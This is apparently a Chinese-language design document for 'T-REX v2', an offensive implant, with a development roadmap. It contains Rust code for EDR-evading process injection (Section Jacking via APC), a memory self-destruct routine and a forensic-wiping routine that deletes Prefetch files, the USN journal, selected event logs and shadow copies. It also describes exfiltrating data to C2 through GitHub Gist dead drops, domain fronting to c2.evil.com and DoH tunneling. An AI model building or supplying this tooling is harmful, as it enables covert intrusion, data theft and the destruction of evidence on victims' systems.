# T-REX v2 · 网络投递侦察探针（精简版）

> 📚 **参考文档** — 外部资料/ API 参考/设计探索，与当前代码状态无关。项目实际能力见 [`README.md`](../../README.md) 与 [`docs/audits/AUTHORITATIVE_FACTS_2026-07-18.md`](../audits/AUTHORITATIVE_FACTS_2026-07-18.md)。
> 实施进度见 README.md Roadmap。

> **制定:** 2026-07-07 · **原则:** 网络投递，网络外传。不碰 USB。不搞学术边信道。

---

## 五件事

```
投 递 ──→ 侦 察 ──→ 外 传 ──→ 自 毁 ──→ 反取证
```

| # | 能力 | 一句话 |
|---|------|--------|
| **1** | 投递 | 怎么注入到目标进程而不被 EDR 发现 |
| **2** | 侦察 | 注入后怎么摸清目标的安全态势 |
| **3** | 外传 | 怎么把侦察报告传回 C2 而不被网络层检测 |
| **4** | 自毁 | 传完后怎么从内存中彻底消失 |
| **5** | 反取证 | 怎么清理落地痕迹（如果有的话） |

---

## 1. 投递（2026 最新注入技术）

> **情报来源:** Section Jacking (SECFORCE 2026) · zero-loader (xAL6 2026) · Threadless Ops II (2026) · RemotePE Lazarus (Fox-IT 2026)

| 技术 | 原理 | 检测面 |
|------|------|--------|
| **Section Jacking** | `NtCreateSection` 共享内存 + 劫持目标进程现有线程，零 `WriteProcessMemory`，零 `CreateRemoteThread` | 仅 `NtMapViewOfSection` 跨进程 + `NtQueueApcThread` |
| **Module Stomping** | 覆盖已加载 DLL 的 `.text`（从白名单中轮换：`comctl32.dll` / `dnsapi.dll` / `winmm.dll`），调用栈显示合法模块 | `.text` hash 与磁盘不一致 |
| **Fiber-based execution** | 将 shellcode 注册为 fiber，劫持目标线程 → `SwitchToFiber`，零新线程创建 | 无新线程，但 fiber 非标准 |
| **Synthetic Stack** | 分配 1MB 假栈 → 在假栈上执行 → 真正的 RSP 指向 normal 栈，调用栈 unwinding 无异常 | 大块 RWX 内存可疑 |

**T-REX 投递链：**

```
Stage 0: PIC shellcode (<512B) → 远程注入到目标进程
    ↓
Stage 1: 反射 DLL → PEB walk → 手动解析导入表 → 基址重定位
    ↓
Stage 2: Module Stomping → 覆盖 comctl32.dll 的 .text
    ↓         Section Jacking → 共享内存写入 → 零 WriteProcessMemory
    ↓         或 Fiber hijack → SwitchToFiber → 零 CreateRemoteThread
    ↓
T-REX Core: 侦察模块加载 → 执行 → 外传 → 自毁
```

**Rust 实现:**

```rust
// trex/delivery/section_jacking.rs

/// Section Jacking: 零 WriteProcessMemory, 零 CreateRemoteThread
pub unsafe fn section_jacking_inject(
    target_pid: u32,
    shellcode: &[u8],
) -> Result<(), Error> {
    // 1. 打开目标进程
    let h_target = NtOpenProcess(target_pid, PROCESS_VM_OPERATION | PROCESS_VM_WRITE)?;

    // 2. 创建共享 section (RW)
    let h_section = NtCreateSection(
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        shellcode.len()
    )?;

    // 3. 本地映射 (RW) — 写入 shellcode
    let local_view = NtMapViewOfSection(h_section, CURRENT_PROCESS, PAGE_READWRITE)?;
    copy_nonoverlapping(shellcode.as_ptr(), local_view, shellcode.len());

    // 4. 远程映射 (RX) — 同一物理页，零跨进程写入
    let remote_view = NtMapViewOfSection(h_section, h_target, PAGE_EXECUTE_READ)?;

    // 5. 取消本地映射
    NtUnmapViewOfSection(CURRENT_PROCESS, local_view);

    // 6. 劫持目标线程 (APC 方式，零 CreateRemoteThread)
    let h_thread = find_target_thread(h_target)?;
    NtQueueApcThread(h_thread, remote_view as usize, 0, 0);

    Ok(())
}
```

---

## 2. 侦察（已有 T-REX v1 + 升级）

> **现状:** `trex.rs` 已实现 T0-T3 四级噪声分级探测，25 厂商 EDR 匹配，7 类 mitigation policy 查询。

**2026 升级:**

| 新增 | 来源 | 内容 |
|------|------|------|
| **T4: Kernel Module** | S12 (2026.04) | `NtQuerySystemInformation(SystemModuleInformation)` → 内核驱动名匹配 |
| **T5: Code Integrity** | S12 (2026.04) | `NtQuerySystemInformation(SystemCodeIntegrityInformation)` class 103 → HVCI/VBS/TESTSIGN status |
| **T6: ETW-TI Probe** | S12 (2026.05) | GUID `F4E1897C...` → `NtTraceControl` → IsEnabled 查询 |
| **Decision Engine** | 自研 | Clean → ConsumerAV → EnterpriseEDR → KernelArmed → Fortress → 自动推荐逃避级别 |

**数据加密:** X25519 + ML-KEM-1024 混合 → ChaCha20-Poly1305 → 内存加密暂存。

---

## 3. 外传（2026 网络隐蔽信道）

> **情报来源:** Dead Drop Resolver Taxonomy (Delta ThreatLabs 2026) · Cloudflare 2026 Threat Report · Underminr (2026)

**三层信道，按隐蔽性降级：**

| 优先级 | 信道 | 原理 | 2026 案例 |
|--------|------|------|---------|
| **1** | **Dead Drop Resolver** | 侦察报告 → `POST gist.github.com` → 返回 Gist ID → C2 拉取。攻击/外传流量完全分离 | NastyShrew (Russia 2026): Pastebin DDR · FrumpyToad (China 2026): Google Calendar C2 |
| **2** | **HTTPS Domain Fronting** | SNI = `cdn.cloudflare.com` · Host = `c2.evil.com` → CDN 边缘路由到真实 C2 | Underminr (2026): DNS→SNI→Host 三级跳 · PunyToad (China 2026): 加密隧道过 egress filter |
| **3** | **DoH DNS Tunneling** | 侦察报告 → Base64 → DNS TXT 查询 → DoH 封装在 TLS 1.3 内 → 零明文 DNS | Godlua · OilRig APT: DoH C2 外传 |
| **4** | **直接 HTTPS** | `POST /api/v2/telemetry` → JSON payload → JA4 指纹随机化 → Chrome/Firefox/Safari/Edge | 最后备用，最高带宽 |

**Dead Drop 操作流程（最隐蔽）：**

```
                    ┌──────────────────────────────┐
                    │   1. T-REX 在网络主机上运行     │
                    │   2. 完整侦察 (T0-T6)          │
                    │   3. X25519+ML-KEM 加密报告    │
                    └──────────────┬───────────────┘
                                   │
                    ┌──────────────▼───────────────┐
                    │   4. POST https://api.github. │
                    │      com/gists                 │
                    │      { "public": false,        │
                    │        "files": {              │
                    │          "crash.log": {        │
                    │            "content": "<b64>"  │
                    │          }}}                   │
                    └──────────────┬───────────────┘
                                   │
                    ┌──────────────▼───────────────┐
                    │   5. GitHub 返回 Gist ID       │
                    │   6. T-REX 将 Gist ID 通过     │
                    │      辅助信道传给 C2           │
                    │      (或预置的 Telegram bot)   │
                    └──────────────┬───────────────┘
                                   │
                    ┌──────────────▼───────────────┐
                    │   7. C2: GET /gists/{id}       │
                    │   8. 解码 + 解密 → 侦察报告    │
                    │   9. DELETE /gists/{id}         │
                    └──────────────────────────────┘

  检测分析:
  - GitHub API 调用 = 正常开发者流量（全 TLS 1.3）
  - Gist 内容 = Base64 + AES-256-GCM 密文 = 不可区分随机数据
  - 一次写入、一次读取、一次删除 = 生命周期 <30 秒
  - 无 C2 IP/Domain 直连
```

**C2 通知辅助信道（Gist ID 怎么传给 C2）：**

- **Telegram Bot API**: `sendMessage(chat_id, gist_id)` — 正常 IM 流量
- **DNS TXT 记录**: 动态 DNS 更新 — `gist-id.c2.domain TXT "abc123"`
- **预置 Webhook**: `POST https://c2.domain/webhook` — 最小化连接
- **完全异步**: Gist ID 嵌入在 Stage 0 的配置中，C2 定期轮询已知 Gist 账户

---

## 4. 自毁（2026 零痕迹）

> **情报来源:** maldev Cleanup (2026) · zero-loader (xAL6 2026) · RemotePE Lazarus (Fox-IT 2026)

**五步自毁序列：**

```rust
// trex/melt.rs

pub unsafe fn self_destruct_sequence() -> ! {
    // Step 1: 清零所有敏感内存
    //   - RC4/ChaCha20 密钥 → SecureZeroMemory
    //   - 解密后的侦察报告 → RtlZeroMemory
    //   - C2 地址/Token → 覆写为 0x00
    secure_zero(&mut KEYS_BUFFER);
    secure_zero(&mut DECRYPTED_REPORT);

    // Step 2: 擦除 RX 代码页
    //   - Module Stomping 覆盖的 .text → 恢复原始字节（如果保存了）
    //   - 自分配 shellcode 页 → VirtualProtect(RW) → RtlZeroMemory → VirtualFree(MEM_RELEASE)
    for &page in &ALLOCATED_PAGES {
        NtProtectVirtualMemory(page, PAGE_READWRITE);
        RtlZeroMemory(page, PAGE_SIZE);
        NtFreeVirtualMemory(page, 0, MEM_RELEASE);
    }

    // Step 3: 清理 PE 头（防 PE-sieve 检测）
    //   - 模块基址 → PE header → 覆写为 0x00（前 4096 字节）
    RtlZeroMemory(module_base, 0x1000);

    // Step 4: 关闭所有句柄
    for &handle in &OPEN_HANDLES {
        NtClose(handle);
    }

    // Step 5: 线程自终止
    //   - RtlExitUserThread(0) 或 NtTerminateThread(NT_CURRENT_THREAD, 0)
    //   - 不使用 ExitProcess — 不触发 DLL_PROCESS_DETACH
    NtTerminateThread(NT_CURRENT_THREAD, 0);

    // Unreachable
    loop { core::hint::spin_loop(); }
}
```

**如果投递时有落地文件（Stager 写磁盘）：**

```rust
// trex/cleanup/disk.rs

pub unsafe fn wipe_disk_traces() {
    // 1. Self-delete: FILE_DISPOSITION_POSIX_SEMANTICS (Win11 24H2 fix)
    let h = NtCreateFile(stager_path, DELETE | SYNCHRONIZE);
    let mut disp = FILE_DISPOSITION_INFO_EX {
        Flags: FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS,
    };
    NtSetInformationFile(h, &mut disp, FileDispositionInformationEx);

    // 2. Prefetch: 删除 C:\Windows\Prefetch\*.pf
    delete_prefetch_entries(&[L"TREX.EXE", L"RUNDLL32.EXE"]);

    // 3. USN Journal: 删除 + 重建（覆盖旧记录）
    let h_vol = NtCreateFile("\\\\.\\C:", ...);
    DeviceIoControl(h_vol, FSCTL_DELETE_USN_JOURNAL, ...);
    DeviceIoControl(h_vol, FSCTL_CREATE_USN_JOURNAL, ...);

    // 4. Event Log: 选择性清除事件 ID 4688 (进程创建)
    clear_event_log_entries(&[4688, 1102, 104]);

    // 5. MFT: 覆写已删除文件条目
    overwrite_mft_entry(stager_path);
}
```

---

## 5. 反取证（如果落地）

> **原则:** 优先零磁盘（纯内存投递）。只有 Stager 不得不写磁盘时，才执行清理。

| 痕迹 | 位置 | 清理方式 |
|------|------|---------|
| **文件** | `C:\Windows\Temp\*.dll` | Self-delete `FileDispositionInformationEx(POSIX)` |
| **Prefetch** | `C:\Windows\Prefetch\*.pf` | `NtDeleteFile` + 覆写扇区 |
| **USN Journal** | `$Extend\$UsnJrnl` | `FSCTL_DELETE_USN_JOURNAL` → 重建 |
| **Event Log** | `%SystemRoot%\System32\winevt\Logs\` | 选择性清除 4688/1102/104 |
| **MFT 记录** | `$MFT` | 覆写已删除文件条目（3-pass 随机数据） |
| **Amcache** | `HKLM\SYSTEM\...\AppCompatCache` | 注册表覆盖 |
| **Shimcache** | `HKLM\SYSTEM\...\AppCompatCache` | 同上 |
| **VSS 快照** | 卷影副本 | `vssadmin delete shadows /all`（高噪，可选） |
| **内存 dump** | `%SystemRoot%\MEMORY.DMP` | `NtDeleteFile` + 覆写 |

**注意:** NTFS 反取证永远不完美——MFT/$LogFile/USN/VSS 形成交叉验证网。最可靠的方案是**零磁盘投递**，根本不在磁盘上创建任何文件。

---

## 精简后的时间线

```
2026 Q3 ──────────────────────────────────────────────────
  Jul │ P7 ■ 已交付
  Aug │ P8 ─ T-REX v2: 投递 + 侦察 + 外传 + 自毁 + 反取证
  Sep │ P9 ─ Nyx 加密 CNSA 2.0 升级
  Oct │ P10 ─ 多信道传输层
```

**即刻行动:**

```
1. 创建 trex/delivery/section_jacking.rs — Section Jacking 注入器
2. 创建 trex/exfil/deaddrop.rs — GitHub Gist Dead Drop Resolver
3. 创建 trex/melt.rs — 五步自毁序列
4. 创建 trex/cleanup/disk.rs — 取证痕迹清理
```
